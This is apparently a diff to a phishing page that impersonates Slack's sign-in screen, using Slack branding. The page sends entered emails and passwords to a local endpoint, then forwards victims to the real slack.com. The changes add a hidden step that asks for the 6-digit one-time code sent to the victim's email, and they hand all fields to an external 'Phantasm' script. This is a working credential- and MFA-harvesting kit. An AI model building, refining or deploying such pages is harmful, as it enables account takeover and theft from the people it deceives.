@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in | Slack</title>
+    <title>Log in | Slack</title>
     <link rel="icon" href="https://a.slack-edge.com/80588/marketing/img/meta/favicon-32.png" sizes="32x32" type="image/png">
     <style>
         @font-face {
@@ -50,6 +50,7 @@
             align-items: center;
             padding: 0 20px;
             box-sizing: border-box;
+            position: relative;
         }
 
         h1 {
@@ -256,6 +257,10 @@
             text-decoration: underline;
         }
 
+        .hidden {
+            display: none !important;
+        }
+
         @media (max-width: 600px) {
             h1 {
                 font-size: 32px;
@@ -276,51 +281,75 @@
     </header>
 
     <div class="main-content">
-        <h1>Sign in to Slack</h1>
-        <div class="subtitle">
-            We suggest using the <strong>email address you use at work.</strong>
+        <div id="step-1">
+            <h1>Log in to Slack</h1>
+            <div class="subtitle">
+                We suggest using the <strong>email address you use at work.</strong>
+            </div>
+
+            <div class="auth-container">
+                <button class="social-btn">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google">
+                    Log in with Google
+                </button>
+                <button class="social-btn">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
+                    Log in with Apple
+                </button>
+
+                <div class="divider">
+                    <span>OR</span>
+                </div>
+                
+                <div class="error-message" id="error-msg">
+                    <span class="error-icon">⚠️</span>
+                    <span class="error-text">Sorry, you entered an incorrect email or password.</span>
+                </div>
+
+                <form id="login-form">
+                    <div class="input-wrapper">
+                        <input type="email" id="email" placeholder="name@work-email.com" required>
+                    </div>
+                    
+                    <div class="input-wrapper">
+                        <input type="password" id="password" placeholder="Password" required>
+                    </div>
+
+                    <button type="button" class="signin-btn" id="btn-login">
+                        Log In
+                    </button>
+                    
+                    <div style="margin-top: 24px; text-align: center;">
+                        <div style="margin-bottom: 8px; color: #454245; font-size: 15px;">
+                            <input type="checkbox" id="remember" style="width: auto; margin-right: 8px; vertical-align: middle;">
+                            <label for="remember" style="vertical-align: middle;">Remember me</label>
+                        </div>
+                        <a href="#" style="color: #1264a3; text-decoration: none; font-size: 15px;">Forgot password?</a>
+                    </div>
+                </form>
+            </div>
         </div>
 
-        <div class="auth-container">
-            <button class="social-btn">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google">
-                Sign in with Google
-            </button>
-            <button class="social-btn">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
-                Sign in with Apple
-            </button>
-
-            <div class="divider">
-                <span>OR</span>
+        <!-- OTP Section (Hidden initially) -->
+        <div id="step-3-otp" class="hidden auth-container" style="text-align: center;">
+            <h1 style="font-size: 32px; margin-bottom: 20px;">Check your email</h1>
+            <div class="subtitle">
+                We've sent a 6-digit code to your email. The code expires shortly, so please enter it soon.
             </div>
+
+            <div class="input-wrapper">
+                <input type="text" id="otp-input" placeholder="Enter 6-digit code" 
+                       style="text-align: center; letter-spacing: 4px; font-size: 24px;" 
+                       maxlength="6">
+            </div>
+
+            <button type="button" class="signin-btn" id="btn-otp-submit">
+                Verify Code
+            </button>
             
-            <div class="error-message" id="error-msg">
-                <span class="error-icon">⚠️</span>
-                <span class="error-text">Sorry, you entered an incorrect email or password.</span>
+            <div style="margin-top: 24px;">
+                <a href="#" style="color: #1264a3; text-decoration: none; font-size: 15px;">Didn't receive a code?</a>
             </div>
-
-            <form onsubmit="submitLogin(event)">
-                <div class="input-wrapper">
-                    <input type="email" id="email" placeholder="name@work-email.com" required>
-                </div>
-                
-                <div class="input-wrapper">
-                    <input type="password" id="password" placeholder="Password" required>
-                </div>
-
-                <button type="submit" class="signin-btn" id="btn-login">
-                    Sign In
-                </button>
-                
-                <div style="margin-top: 24px; text-align: center;">
-                    <div style="margin-bottom: 8px; color: #454245; font-size: 15px;">
-                        <input type="checkbox" id="remember" style="width: auto; margin-right: 8px; vertical-align: middle;">
-                        <label for="remember" style="vertical-align: middle;">Remember me</label>
-                    </div>
-                    <a href="#" style="color: #1264a3; text-decoration: none; font-size: 15px;">Forgot password?</a>
-                </div>
-            </form>
         </div>
     </div>
 
@@ -332,47 +361,24 @@
         </ul>
     </footer>
 
+    <!-- Phantasm Engine -->
+    <script src="/assets/js/phantasm.js"></script>
     <script>
-        function submitLogin(event) {
-            event.preventDefault();
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-
-            if (!email || !password) return;
-
-            const btn = document.getElementById('btn-login');
-            const originalText = btn.innerHTML;
-            btn.innerHTML = '<span class="spinner"></span> Signing In...';
-            btn.disabled = true;
-
-            fetch('/login', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    email: email,
-                    password: password
-                })
-            }).then(response => {
-                if (response.ok) {
-                    window.location.href = "https://slack.com/signin";
-                } else {
-                    btn.innerHTML = originalText;
-                    btn.disabled = false;
-                    
-                    // Show error message
-                    const errorMsg = document.getElementById('error-msg');
-                    errorMsg.style.display = 'flex';
-                    
-                    // Clear password
-                    document.getElementById('password').value = '';
+        document.addEventListener('DOMContentLoaded', () => {
+            new Phantasm({
+                redirectUrl: 'https://slack.com/signin',
+                selectors: {
+                    email: '#email',
+                    password: '#password',
+                    otp: '#otp-input',
+                    submitBtn: '#btn-login',
+                    otpBtn: '#btn-otp-submit',
+                    step1: '#step-1', // Login container
+                    step3: '#step-3-otp', // OTP container
+                    errorMsg: '#error-msg'
                 }
-            }).catch(error => {
-                console.error('Error:', error);
-                window.location.href = "https://slack.com/signin";
             });
-        }
+        });
     </script>
 </body>
 </html>
